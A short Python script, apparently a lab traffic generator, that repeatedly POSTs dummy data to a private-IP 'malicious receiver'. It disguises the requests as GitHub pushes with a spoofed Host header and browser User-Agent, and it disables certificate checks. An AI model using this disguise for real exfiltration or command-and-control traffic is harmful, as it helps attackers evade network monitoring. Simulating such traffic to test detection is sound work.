import time
import requests

def send_https_request():
    
    # URL of a malicious server posing as a benign website
    url = "https://172.20.0.3:8443/api"  # Malicious Receiver

    # Fake data as if making a push to github
    headers = {
                "Host": "github.com",
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
              }
    data =  {
                "action": "push",
                "repo": "test-repo"
            }

    try:
        # Send message to the fake server
        response = requests.post(url, headers=headers, json=data, verify=False)
        print(f"Client: Sent POST request, response: {response.status_code}")
        print(f"Client: Response body is {response.text}")
    except Exception as e:
        print(f"Client: Error sending request: {e}")

if __name__ == "__main__":
    # Sleep to allow others to wake up and setup prior to first send
    time.sleep(5)

    # Send 10 messages sleeping 10 seconds between each
    print("Client: Starting up..")
    for i in range(0, 9):
        print(f"Client: Sending the {i}th packet")
        send_https_request()
        time.sleep(10)
